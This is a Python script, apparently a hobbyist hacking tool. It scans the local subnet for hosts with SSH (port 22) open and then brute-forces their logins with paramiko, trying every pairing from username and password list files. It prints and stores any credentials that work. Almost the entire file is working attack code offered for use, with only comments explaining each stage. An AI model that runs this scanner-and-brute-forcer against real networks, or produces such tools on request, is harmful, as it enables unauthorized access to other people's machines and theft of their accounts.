#Author: Richard T Swierk
import socket, os, sys, threading, random, paramiko
from datetime import datetime

t1=datetime.now()

#The lists that are filled during the program
isOpen=[]
scanned=[]
ipInfo=[]
found=[False,'22']

#Dictionary the holds all of the found logins
foundLogin={}

#These turn the text files passwords.txt and usernames.txt into lists
usernames=[line.strip() for line in open('usernames.txt').readlines()]
passwords=[line.strip() for line in open('passwords.txt').readlines()]

#This gets the users local ip address
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
localIP=s.getsockname()[0]
s.close()
localIP=localIP[:localIP.rindex('.')+1]

#This function is going to first ping a random ip address that is on your network then if it is up
#it will scan the ip address to check if it has port 22 open
#If port 22 is open it will put it into the isOpen list. It will also put the ip address port number and hostname into
#the list ipInfo. This part take about 20 seconds to complete
def portScan(start,end,step):
    for x in range(start,end,step):
        IP=str(localIP+str(random.randint(1,254)))
        while IP in scanned:
            IP=str(localIP+str(random.randint(1,254)))
        else:
            scanned.append(IP)
        if os.system("ping -w 5 -n 1 "+IP)==0:
            try:
                sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                sock.settimeout(2)
                result=sock.connect_ex((IP,22))
                if result==0:
                    isOpen.append(IP)
                    ipInfo.append(IP+str(' : 22 : ')+socket.getfqdn(IP))
                sock.close()
            except KeyboardInterrupt:
                sys.exit()
            except socket.gaierror:
                pass

#This is the brute forcing function that runs after all the ip addresses with ssh open are found
#This uses the passwords and usernames list made in the begining of the program
#It will try to login to the ip address through ssh using a combination of a username and password from the lists
#If a correct username and password combination is found it will print it to the screen and put it into the dictionary
#The found variable is used to kill the threads when a working username and password combination is found
#This part takes the longest in the whole program. About 2 minutes and 30 seconds for each ip address
def bruteforce(start,end,step):
    global found
    for z in range(len(isOpen)):
        for y in range(start,end,step):
            for x in range(len(usernames)):
                if found[0]==True and found[1]==str(z):
                    pass
                else:
                    ssh=paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        ssh.connect(isOpen[z],port=22,username=usernames[x],password=passwords[y])
                        ssh.close()
                        print(isOpen[z],usernames[x],passwords[y])
                        foundLogin['IP']=isOpen[z]
                        foundLogin['Username']=usernames[x]
                        foundLogin['Password']=passwords[y]
                        found[0]=True
                        found[1]=str(z)
                    except:
                        pass
                    ssh.close()

#This is the function to create the threads that run both the portScan and bruteforce functions.
def threads(numThreads,function,argument):
    activeThreads=threading.activeCount()
    try:
        for num in range(numThreads):
            threading.Thread(target=function, args=(num,argument,numThreads)).start()
    except KeyboardInterrupt:
        sys.exit()
#This statement below is used to make the program wait untill all the threads are finish. Without this
#the program will think that it is done while the threads are still running
    while threading.activeCount()>activeThreads:
        pass

#These are all the calls to the functions and where everything is printed
print('╔╗──────────────╔╗──╔╦═══╗\n║║──────────────║╚╗╔╝║╔═╗║\n║║──╔══╦══╦╦═╗──╚╗║║╔╩╝╔╝║\n║║─╔╣╔╗║╔╗╠╣╔╗╦══╣╚╝║╔═╝╔╝\n║╚═╝║╚╝║╚╝║║║║╠══╩╗╔╝║║╚═╗\n╚═══╩══╩═╗╠╩╝╚╝───╚╝─╚═══╝\n───────╔═╝║\n───────╚══╝')

threads(15,portScan,254)
print(datetime.now()-t1)
print("IP : open port : hostname")
for x in range(len(ipInfo)):
    print(ipInfo[x])
print(datetime.now())
print('Trying to brute force....')

threads(2,bruteforce,len(passwords))
print(datetime.now()-t1)
